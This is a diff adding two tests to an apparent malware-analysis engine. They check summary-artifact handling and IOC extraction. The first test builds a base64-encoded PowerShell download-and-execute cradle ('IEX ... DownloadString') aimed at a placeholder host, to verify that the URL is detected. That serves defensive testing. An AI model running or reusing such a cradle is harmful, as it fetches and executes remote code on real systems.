@@ -155,6 +155,48 @@ def test_optional_cab_analyzer_extracts_members():
     assert dict(analyzer.analyze(data)) == {"evidence.txt": payload}
 
 
+def test_analyzer_metadata_artifacts_are_terminal_but_still_feed_iocs():
+    command = (
+        "IEX (New-Object Net.WebClient).DownloadString('http://meta.example/a.ps1')"
+    )
+    encoded = base64.b64encode(command.encode("utf-16-le"))
+    script = b"powershell -nop -EncodedCommand " + encoded
+    report = TitanEngine().run_analysis(script)
+    nodes = report["nodes"]
+    summaries = [
+        node for node in nodes if node.get("artifact_name") == "script_summary.json"
+    ]
+    assert summaries
+    summary = summaries[0]
+    # The analyzer-authored summary is recorded but never fed back through
+    # decoders or analyzers, so it stays a childless ANALYZE-terminal node.
+    assert summary["method"] == "ANALYZE"
+    assert summary["analysis_state"] == "terminal"
+    assert "metadata" in summary["termination_reason"]
+    assert all(node.get("parent") != summary["id"] for node in nodes)
+    # Its preview still contributes to report-level IOC extraction.
+    assert "http://meta.example/a.ps1" in report["iocs"]["urls"]
+
+
+def test_email_attachment_cannot_shadow_the_summary_artifact():
+    message = (
+        b"From: sender@example.org\r\n"
+        b"To: analyst@example.org\r\n"
+        b"Subject: Shadow\r\n"
+        b"MIME-Version: 1.0\r\n"
+        b"Content-Type: multipart/mixed; boundary=x\r\n\r\n"
+        b"--x\r\nContent-Type: application/octet-stream\r\n"
+        b"Content-Disposition: attachment; filename=summary.json\r\n\r\n"
+        b'{"not": "the analyzer summary"}\r\n--x--\r\n'
+    )
+    artifacts = EmailAnalyzer().analyze(message)
+    names = [name for name, _ in artifacts]
+    assert names.count("email_summary.json") == 1
+    summary = json.loads(dict(artifacts)["email_summary.json"])
+    assert summary["analyzer"] == "email"
+    assert "email_summary_2.json" in names
+
+
 def test_structured_analyzers_are_registered_deterministically():
     names = [analyzer.name for analyzer in TitanEngine().analyzers]
     assert names == sorted(names)
